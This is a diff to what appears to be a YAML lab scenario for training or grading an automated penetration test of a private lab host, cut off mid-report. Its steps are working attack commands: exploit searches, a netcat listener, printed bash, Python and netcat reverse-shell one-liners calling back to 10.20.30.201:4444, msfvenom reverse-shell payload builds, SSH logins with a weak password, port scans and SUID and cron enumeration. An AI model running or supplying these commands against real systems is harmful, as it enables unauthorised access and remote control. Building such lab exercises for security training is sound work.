@@ -23,6 +23,7 @@ steps:
     type: output_contains
     expect: Exploit
     field: stdout
+  target_vm: attacker
   script: searchsploit apache 2.4 && echo '---' && searchsploit openssh
   risk_level: low
 - order: 2
@@ -36,6 +37,7 @@ steps:
     type: output_contains
     expect: exploit
     field: stdout
+  target_vm: attacker
   script: msfconsole -q -x 'search type:exploit name:nodejs; exit' 2>/dev/null | head -30
   risk_level: low
 - order: 3
@@ -49,6 +51,7 @@ steps:
     type: output_contains
     expect: 10.20.30.80
     field: stdout
+  target_vm: attacker
   script: msfconsole -q -x 'use auxiliary/scanner/http/http_version; set RHOSTS 10.20.30.80; set RPORT 3000; run; exit' 2>/dev/null
   risk_level: low
 - order: 4
@@ -62,6 +65,7 @@ steps:
     type: output_contains
     expect: Listener started
     field: stdout
+  target_vm: attacker
   script: timeout 5 nc -lvnp 4444 2>&1 & echo 'Listener started on port 4444' && sleep 1 && echo 'test connection' | nc -w 1 localhost 4444 2>/dev/null; wait
   risk_level: medium
 - order: 5
@@ -76,6 +80,7 @@ steps:
     type: output_contains
     expect: Reverse Shell Payloads
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Reverse Shell Payloads ==='' && echo ''Bash: bash -i >& /dev/tcp/10.20.30.201/4444 0>&1'' && echo ''Python: python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"10.20.30.201\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"''
     && echo ''Netcat: nc -e /bin/bash 10.20.30.201 4444'''
   risk_level: medium
@@ -90,6 +95,7 @@ steps:
     type: output_contains
     expect: ELF
     field: stdout
+  target_vm: attacker
   script: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/reverse_shell.elf 2>/dev/null && file /tmp/reverse_shell.elf && ls -la /tmp/reverse_shell.elf
   risk_level: medium
 - order: 7
@@ -103,6 +109,7 @@ steps:
     type: output_contains
     expect: Linux
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'uname -a && echo --- && cat /etc/os-release' 2>/dev/null
   risk_level: low
 - order: 8
@@ -116,6 +123,7 @@ steps:
     type: output_contains
     expect: service
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'systemctl list-units --type=service --state=running' 2>/dev/null | head -30
   risk_level: low
 - order: 9
@@ -129,6 +137,7 @@ steps:
     type: output_contains
     expect: error
     field: stdout
+  target_vm: attacker
   script: curl -s http://10.20.30.80:3000/api/Quantitys 2>/dev/null | python3 -m json.tool 2>/dev/null || curl -s http://10.20.30.80:3000/api/Quantitys
   risk_level: medium
 - order: 10
@@ -142,6 +151,7 @@ steps:
     type: output_contains
     expect: OPEN
     field: stdout
+  target_vm: attacker
   script: 'python3 -c "import socket; [print(f''Port {p}: OPEN'') for p in range(1,1025) if socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((''10.20.30.80'', p)) == 0]" 2>/dev/null'
   risk_level: medium
 - order: 11
@@ -155,6 +165,7 @@ steps:
     type: output_contains
     expect: http
     field: stdout
+  target_vm: attacker
   script: msfconsole -q -x 'use auxiliary/scanner/http/http_login; set RHOSTS 10.20.30.80; set RPORT 3000; set AUTH_URI /rest/user/login; info; exit' 2>/dev/null | head -30
   risk_level: medium
 - order: 12
@@ -168,6 +179,7 @@ steps:
     type: output_contains
     expect: cron
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'crontab -l 2>/dev/null; echo ---; cat /etc/crontab 2>/dev/null; echo ---; ls -la /etc/cron.d/ 2>/dev/null' 2>/dev/null
   risk_level: low
 - order: 13
@@ -181,6 +193,7 @@ steps:
     type: output_contains
     expect: /usr
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'find / -perm -4000 -type f 2>/dev/null' 2>/dev/null
   risk_level: low
 - order: 14
@@ -194,6 +207,7 @@ steps:
     type: output_contains
     expect: truncated
     field: stdout
+  target_vm: attacker
   script: msfvenom -p python/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f raw 2>/dev/null | base64 | head -5 && echo '...(truncated)'
   risk_level: medium
 - order: 15
@@ -210,6 +224,7 @@ steps:
     type: output_contains
     expect: System Exploit Report
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== System Exploit Report ===\n\n[Attack Surface]\n- Apache 2.4 (port 80)\n- Node.js/JuiceShop (port 3000)\n- SSH (port 22)\n\n[Findings]\n1. Kernel version identified\n2. SUID binaries
     enumerated\n3. Cronjob configurations reviewed\n4. Service list collected\n5. Reverse shell payloads prepared\n\n[Kill Chain Progress]\n1. Reconnaissance: Complete\n2. Initial Access: JuiceShop SQLi/SSH
     weak password\n3. Execution: Reverse shell ready\n\n[Recommendations]\n1. Patch kernel to latest version\n2. Remove unnecessary SUID bits\n3. Audit cronjob permissions\n4. Disable unused services\n5.
